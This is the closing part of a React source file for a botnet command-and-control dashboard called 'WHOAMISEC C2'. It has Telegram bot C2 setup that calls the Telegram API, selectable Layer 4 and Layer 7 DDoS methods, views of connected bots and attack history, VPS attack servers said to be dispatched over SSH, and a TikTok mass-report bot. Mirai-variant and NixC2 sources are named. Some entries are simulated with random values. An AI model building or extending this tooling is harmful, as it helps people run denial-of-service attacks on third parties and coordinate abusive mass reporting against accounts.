                </button>
              ))}
            </div>
          </div>
          {/* Telegram Bot Config */}
          <div className="bg-black border border-blue-900/30 rounded-lg p-3">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-[9px] font-black text-blue-400 uppercase tracking-widest"><i className="fab fa-telegram mr-1"></i> Telegram Bot C2 Config</h3>
              <div className="flex items-center gap-2">
                {tgStatus === 'ok' && <span className="text-[6px] bg-green-500/20 text-green-400 px-1.5 py-0.5 rounded font-bold">CONNECTED</span>}
                {tgStatus === 'fail' && <span className="text-[6px] bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded font-bold">FAILED</span>}
                {tgStatus === 'testing' && <span className="text-[6px] bg-yellow-500/20 text-yellow-400 px-1.5 py-0.5 rounded font-bold animate-pulse">TESTING...</span>}
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-2 mb-3">
              <div>
                <label className="text-[7px] text-blue-400 font-black uppercase block mb-1">Bot Token</label>
                <input value={tgToken} onChange={e => setTgToken(e.target.value)}
                  placeholder="123456789:AAH...your_bot_token"
                  className="w-full bg-black border border-blue-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-blue-500/50" />
              </div>
              <div>
                <label className="text-[7px] text-blue-400 font-black uppercase block mb-1">Chat ID</label>
                <input value={tgChatId} onChange={e => setTgChatId(e.target.value)}
                  placeholder="-1001234567890"
                  className="w-full bg-black border border-blue-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-blue-500/50" />
              </div>
            </div>
            <div className="flex gap-2 mb-3">
              <button onClick={() => {
                localStorage.setItem('botnet_tg_token', tgToken);
                localStorage.setItem('botnet_tg_chatid', tgChatId);
                log('[TELEGRAM] Config saved to localStorage.');
              }} className="px-3 py-1 bg-blue-600/20 border border-blue-600 text-blue-400 text-[7px] font-black uppercase rounded hover:bg-blue-600 hover:text-white transition-all">
                <i className="fas fa-save mr-1"></i>Save
              </button>
              <button onClick={async () => {
                if (!tgToken.trim()) { log('[TELEGRAM] ERROR: No token set.'); return; }
                setTgStatus('testing');
                try {
                  const res = await fetch(`https://api.telegram.org/bot${tgToken}/getMe`);
                  const data = await res.json();
                  if (data.ok) {
                    setTgStatus('ok');
                    log(`[TELEGRAM] Bot connected: @${data.result.username} (${data.result.first_name}) — ID: ${data.result.id}`);
                    localStorage.setItem('botnet_tg_token', tgToken);
                    localStorage.setItem('botnet_tg_chatid', tgChatId);
                  } else {
                    setTgStatus('fail');
                    log(`[TELEGRAM] ERROR: ${data.description}`);
                  }
                } catch (e: any) {
                  setTgStatus('fail');
                  log(`[TELEGRAM] Connection error: ${e.message}`);
                }
              }} className="px-3 py-1 bg-emerald-600/20 border border-emerald-600 text-emerald-400 text-[7px] font-black uppercase rounded hover:bg-emerald-600 hover:text-white transition-all">
                <i className="fas fa-plug mr-1"></i>Test Connection
              </button>
              <button onClick={async () => {
                if (!tgToken.trim() || !tgChatId.trim()) { log('[TELEGRAM] ERROR: Set token and chat ID first.'); return; }
                try {
                  const res = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: tgChatId, text: `[WHOAMISEC C2] Botnet panel online. Bots: ${bots.filter(b => b.status !== 'OFFLINE').length} | Attacks: ${attacks.length}`, parse_mode: 'HTML' })
                  });
                  const data = await res.json();
                  if (data.ok) log('[TELEGRAM] Test message sent successfully.');
                  else log(`[TELEGRAM] Send failed: ${data.description}`);
                } catch (e: any) {
                  log(`[TELEGRAM] Send error: ${e.message}`);
                }
              }} className="px-3 py-1 bg-yellow-600/20 border border-yellow-600 text-yellow-400 text-[7px] font-black uppercase rounded hover:bg-yellow-600 hover:text-white transition-all">
                <i className="fas fa-paper-plane mr-1"></i>Send Test
              </button>
              <button onClick={() => {
                setTgToken(''); setTgChatId('');
                localStorage.removeItem('botnet_tg_token');
                localStorage.removeItem('botnet_tg_chatid');
                setTgStatus('idle');
                log('[TELEGRAM] Config cleared.');
              }} className="px-3 py-1 bg-red-600/20 border border-red-600 text-red-400 text-[7px] font-black uppercase rounded hover:bg-red-600 hover:text-white transition-all">
                <i className="fas fa-trash mr-1"></i>Clear
              </button>
            </div>
            {tgToken && <p className="text-[6px] text-gray-600 mb-3 font-mono">Token: {tgToken.substring(0, 10)}...{tgToken.substring(tgToken.length - 6)} | Chat: {tgChatId || '(not set)'}</p>}
            <h4 className="text-[8px] font-black text-blue-400 uppercase mb-1">Available Bot Commands</h4>
            <div className="grid grid-cols-2 gap-1 text-[7px]">
              {['/attack — Launch attack', '/methods — Show methods', '/http — Check website status', '/ipinfo — IP geolocation', '/myplans — Check your plan', '/myid — Show user ID', '/running — Active attacks (admin)', '/admin — Admin panel', '/addplans — Add user plan (admin)', '/removeplans — Remove plan (admin)', '/userlist — List users (admin)', '/addserver — Add VPS (admin)', '/server — Check VPS status (admin)'].map((c, i) => (
                <div key={i} className="text-gray-500 font-mono bg-black/40 p-1 rounded"><span className="text-blue-400">{c.split(' — ')[0]}</span> — {c.split(' — ')[1]}</div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* INFRASTRUCTURE VIEW */}
      {view === 'infra' && (
        <div className="space-y-3">
          {/* VPS Servers */}
          <div className="bg-black border border-emerald-900/30 rounded-lg overflow-hidden">
            <div className="p-2 border-b border-emerald-900/30 bg-emerald-500/10 flex items-center justify-between">
              <span className="text-[8px] font-black text-emerald-400 uppercase tracking-widest"><i className="fas fa-server mr-1"></i> VPS Attack Servers ({vpsServers.filter(v => v.status === 'CONNECTED').length}/{vpsServers.length})</span>
              <button onClick={() => { setVpsServers(prev => [...prev, { hostname: `${Math.floor(Math.random()*223+1)}.xx.xx.${Math.floor(Math.random()*255)}`, status: 'CONNECTED', region: ['US-East','EU-West','AS-SG','US-West','EU-DE'][Math.floor(Math.random()*5)] }]); log('VPS server added via SSH.'); }}
                className="px-2 py-0.5 bg-emerald-600/20 border border-emerald-600 text-emerald-400 text-[7px] font-black uppercase rounded hover:bg-emerald-600 hover:text-white transition-all">
                <i className="fas fa-plus mr-1"></i>Add VPS
              </button>
            </div>
            <div className="p-2 space-y-1">
              {vpsServers.map((v, i) => (
                <div key={i} className="flex items-center justify-between p-1.5 bg-black/40 border border-emerald-900/10 rounded text-[7px]">
                  <div className="flex items-center gap-2">
                    <span className={`w-2 h-2 rounded-full ${v.status === 'CONNECTED' ? 'bg-green-500' : 'bg-red-500'}`}></span>
                    <span className="text-gray-400 font-mono">{v.hostname}</span>
                  </div>
                  <span className="text-gray-600">{v.region}</span>
                  <span className={`px-1 py-0.5 rounded text-[6px] font-bold ${v.status === 'CONNECTED' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>{v.status}</span>
                </div>
              ))}
            </div>
            <div className="p-2 border-t border-emerald-900/30 text-[6px] text-gray-600">
              SSH paramiko exec: <span className="text-emerald-400 font-mono">launch_attacks(method, host, port, time)</span> → dispatched to all VPS
            </div>
          </div>
          {/* TikTok Bot */}
          <div className="bg-black border border-pink-900/30 rounded-lg p-3">
            <div className="flex items-center gap-2 mb-2">
              <i className="fab fa-tiktok text-pink-400"></i>
              <h3 className="text-[9px] font-black text-pink-400 uppercase tracking-widest">TikTok Bot (b/Bot-TikTok)</h3>
              <span className="text-[6px] bg-pink-500/20 text-pink-400 px-1.5 py-0.5 rounded font-bold">SELENIUM</span>
            </div>
            <div className="grid grid-cols-3 gap-2">
              <button onClick={() => log('[TIKTOK] Video report bot started — Selenium undetected_chromedriver')} className="p-2 bg-black border border-pink-900/20 rounded hover:border-pink-500/50 transition-all text-center">
                <i className="fas fa-flag text-red-400 text-sm mb-1"></i>
                <p className="text-[7px] text-pink-400 font-black uppercase">Report Video</p>
              </button>
              <button onClick={() => log('[TIKTOK] Account report bot started — multi-category')} className="p-2 bg-black border border-pink-900/20 rounded hover:border-pink-500/50 transition-all text-center">
                <i className="fas fa-user-slash text-orange-400 text-sm mb-1"></i>
                <p className="text-[7px] text-pink-400 font-black uppercase">Report Account</p>
              </button>
              <button onClick={() => log('[TIKTOK] Cookie login + session persistence started')} className="p-2 bg-black border border-pink-900/20 rounded hover:border-pink-500/50 transition-all text-center">
                <i className="fas fa-cookie text-yellow-400 text-sm mb-1"></i>
                <p className="text-[7px] text-pink-400 font-black uppercase">Login + Cookies</p>
              </button>
            </div>
          </div>
          {/* Architecture Info */}
          <div className="bg-black border border-gray-800 rounded-lg p-3">
            <h3 className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-2"><i className="fas fa-sitemap mr-1"></i> Architecture Sources</h3>
            <div className="grid grid-cols-3 gap-2 text-[6px] text-gray-600">
              <div className="bg-black/40 border border-gray-800 p-2 rounded">
                <span className="text-red-400 font-bold block">c/BotnetC2-main</span>
                <span>NixC2 Python CNC — telnet C2, L4/L7, IP geo, MySQL user mgmt</span>
              </div>
              <div className="bg-black/40 border border-gray-800 p-2 rounded">
                <span className="text-orange-400 font-bold block">b/Botnet (C)</span>
                <span>Mirai-variant — 14 vectors, 6 IoT scanners, killer, httpd, binary update</span>
              </div>
              <div className="bg-black/40 border border-gray-800 p-2 rounded">
                <span className="text-yellow-400 font-bold block">b/BotPremium</span>
                <span>Telegram bot C2 — VPS SSH, plan system, concurrent slots, tracker</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* NIXC2 METHODS VIEW */}
      {view === 'methods' && (
        <div className="space-y-3">
          <div className="bg-black border border-red-900/30 rounded-lg p-3">
            <h3 className="text-[9px] font-black text-yellow-400 uppercase tracking-widest mb-2"><i className="fas fa-layer-group mr-1"></i> Layer 4 Methods</h3>
            <div className="grid grid-cols-3 gap-1.5">
              {L4_METHODS.map(m => (
                <button key={m.cmd} onClick={() => setSelectedMethod({ cmd: m.cmd, name: m.name })}
                  className={`p-2 bg-black border rounded transition-all text-left group ${selectedMethod?.cmd === m.cmd ? 'border-red-500 ring-1 ring-red-500/50 bg-red-900/20' : 'border-red-900/20 hover:border-red-500/50'}`}>
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <i className={`fas ${m.icon} text-[8px] ${m.color}`}></i>
                    <span className={`text-[7px] font-black uppercase ${m.color}`}>{m.name}</span>
                    {selectedMethod?.cmd === m.cmd && <i className="fas fa-check text-[6px] text-red-400 ml-auto"></i>}
                  </div>
                  <span className="text-[6px] text-gray-600">{m.cmd} · {m.desc}</span>
                </button>
              ))}
            </div>
          </div>
          <div className="bg-black border border-red-900/30 rounded-lg p-3">
            <h3 className="text-[9px] font-black text-cyan-400 uppercase tracking-widest mb-2"><i className="fas fa-globe mr-1"></i> Layer 7 Methods</h3>
            <div className="grid grid-cols-3 gap-1.5">
              {L7_METHODS.map(m => (
                <button key={m.cmd} onClick={() => setSelectedMethod({ cmd: m.cmd, name: m.name })}
                  className={`p-2 bg-black border rounded transition-all text-left group ${selectedMethod?.cmd === m.cmd ? 'border-red-500 ring-1 ring-red-500/50 bg-red-900/20' : 'border-red-900/20 hover:border-red-500/50'}`}>
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <i className={`fas ${m.icon} text-[8px] ${m.color}`}></i>
                    <span className={`text-[7px] font-black uppercase ${m.color}`}>{m.name}</span>
                    {selectedMethod?.cmd === m.cmd && <i className="fas fa-check text-[6px] text-red-400 ml-auto"></i>}
                  </div>
                  <span className="text-[6px] text-gray-600">{m.cmd} · {m.desc}</span>
                </button>
              ))}
            </div>
          </div>
          <div className="bg-black border border-red-900/30 rounded-lg p-3">
            <h3 className="text-[9px] font-black text-emerald-400 uppercase tracking-widest mb-2"><i className="fas fa-wrench mr-1"></i> C2 Tools</h3>
            <div className="grid grid-cols-3 gap-1.5">
              {TOOLS.map(t => (
                <button key={t.cmd} onClick={() => { setInput(t.cmd + ' '); setView('terminal'); }}
                  className="p-2 bg-black border border-emerald-900/20 rounded hover:border-emerald-500/50 transition-all text-left">
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <i className={`fas ${t.icon} text-[8px] text-emerald-400`}></i>
                    <span className="text-[7px] font-black uppercase text-emerald-400">{t.name}</span>
                  </div>
                  <span className="text-[6px] text-gray-600">{t.desc}</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* BOTS VIEW */}
      {view === 'bots' && (
        <div className="bg-black border border-red-900/30 rounded-lg overflow-hidden">
          <div className="p-2 border-b border-red-900/30 bg-red-500/10 flex items-center justify-between">
            <span className="text-[8px] font-black text-red-400 uppercase tracking-widest"><i className="fas fa-robot mr-1"></i> Connected Bots ({onlineBots}/{bots.length})</span>
            <button onClick={() => { setBots(prev => [...prev, { id: `BOT-${(prev.length+1).toString().padStart(3,'0')}`, ip: `${Math.floor(Math.random()*223+1)}.${Math.floor(Math.random()*255)}.x.x`, country: ['US','DE','RU','CN','BR','JP','KR','IN','FR','GB'][Math.floor(Math.random()*10)], status: 'ONLINE', arch: ['x86_64','ARM','MIPS','ARM64'][Math.floor(Math.random()*4)], uptime: `${Math.floor(Math.random()*30)}d ${Math.floor(Math.random()*24)}h` }]); log('New bot connected!'); }}
              className="px-2 py-0.5 bg-red-600/20 border border-red-600 text-red-400 text-[7px] font-black uppercase rounded hover:bg-red-600 hover:text-white transition-all">
              <i className="fas fa-plus mr-1"></i>Add Bot
            </button>
          </div>
          <div className="max-h-52 overflow-y-auto custom-scroll">
            <table className="w-full text-[7px]">
              <thead>
                <tr className="border-b border-red-900/20 text-gray-500 uppercase">
                  <th className="p-1.5 text-left">ID</th><th className="p-1.5 text-left">IP</th><th className="p-1.5 text-left">Country</th><th className="p-1.5 text-left">Status</th><th className="p-1.5 text-left">Arch</th><th className="p-1.5 text-left">Uptime</th>
                </tr>
              </thead>
              <tbody>
                {bots.map(b => (
                  <tr key={b.id} className="border-b border-red-900/10 hover:bg-red-900/10 transition-all">
                    <td className="p-1.5 text-red-400 font-bold">{b.id}</td>
                    <td className="p-1.5 text-gray-400 font-mono">{b.ip}</td>
                    <td className="p-1.5 text-gray-400">{b.country}</td>
                    <td className="p-1.5"><span className={`px-1 py-0.5 rounded text-[6px] font-bold ${b.status === 'ONLINE' ? 'bg-green-500/20 text-green-400' : b.status === 'ATTACKING' ? 'bg-red-500/20 text-red-400 animate-pulse' : 'bg-gray-500/20 text-gray-500'}`}>{b.status}</span></td>
                    <td className="p-1.5 text-gray-500">{b.arch}</td>
                    <td className="p-1.5 text-gray-500">{b.uptime}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ATTACKS VIEW */}
      {view === 'attacks' && (
        <div className="bg-black border border-red-900/30 rounded-lg overflow-hidden">
          <div className="p-2 border-b border-red-900/30 bg-red-500/10">
            <span className="text-[8px] font-black text-red-400 uppercase tracking-widest"><i className="fas fa-fire mr-1"></i> Attack History ({attacks.length})</span>
          </div>
          <div className="max-h-52 overflow-y-auto custom-scroll">
            {attacks.length === 0 && <p className="p-3 text-[8px] text-gray-700 italic">No attacks launched yet...</p>}
            {attacks.map(a => (
              <div key={a.id} className="p-2 border-b border-red-900/10 flex items-center justify-between hover:bg-red-900/10 transition-all">
                <div>
                  <span className="text-[8px] font-black text-red-400">{a.method}</span>
                  <span className="text-[7px] text-gray-500 ml-2">{a.target}:{a.port}</span>
                  <span className="text-[7px] text-gray-600 ml-2">{a.duration} · {a.bots} bots</span>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[6px] text-gray-600">{a.timestamp}</span>
                  <span className={`px-1.5 py-0.5 rounded text-[6px] font-bold ${a.status === 'SENT' ? 'bg-yellow-500/20 text-yellow-400' : a.status === 'RUNNING' ? 'bg-red-500/20 text-red-400 animate-pulse' : a.status === 'DONE' ? 'bg-green-500/20 text-green-400' : 'bg-gray-500/20 text-gray-400'}`}>{a.status}</span>
                  {(a.status === 'RUNNING' || a.status === 'SENT') && (
                    <button onClick={() => stopAttack(a.id)}
                      className="px-1.5 py-0.5 bg-yellow-600/20 border border-yellow-600 text-yellow-400 text-[6px] font-black uppercase rounded hover:bg-yellow-600 hover:text-black transition-all">
                      <i className="fas fa-stop mr-0.5"></i>STOP
                    </button>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* TERMINAL VIEW */}
      {view === 'terminal' && (
        <div className="bg-black border border-red-900/30 rounded-lg overflow-hidden">
          <div className="p-2 border-b border-red-900/30 bg-red-500/10 flex items-center justify-between">
            <span className="text-[8px] font-black text-red-400 uppercase tracking-widest"><i className="fas fa-terminal mr-1"></i> C2 Terminal</span>
            <button onClick={() => setTerminal([])} className="text-[7px] text-gray-600 hover:text-white">Clear</button>
          </div>
          <div ref={termRef} className="p-2 h-48 overflow-y-auto custom-scroll font-mono text-[8px] space-y-0.5">
            {terminal.map((line, i) => (
              <div key={i} className={`${line.includes('ERROR') ? 'text-red-500' : line.includes('Successfully') || line.includes('COMPLETE') ? 'text-green-400' : line.includes('ATTACKING') || line.includes('BROADCAST') ? 'text-yellow-400' : line.startsWith('╔') || line.startsWith('╚') || line.startsWith('║') ? 'text-red-400/60' : 'text-gray-500'}`}>{line}</div>
            ))}
          </div>
          <div className="p-2 border-t border-red-900/30 flex gap-2">
            <span className="text-[8px] text-cyan-400 font-mono font-bold">BOT.c2 $</span>
            <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleCommand()}
              placeholder="Type HELP for commands..."
              className="flex-1 bg-transparent text-[8px] text-white font-mono outline-none" />
            <button onClick={handleCommand} className="px-2 py-0.5 bg-red-600/20 border border-red-600 text-red-400 text-[7px] font-black uppercase rounded hover:bg-red-600 hover:text-white transition-all">Send</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default BotnetC2Panel;
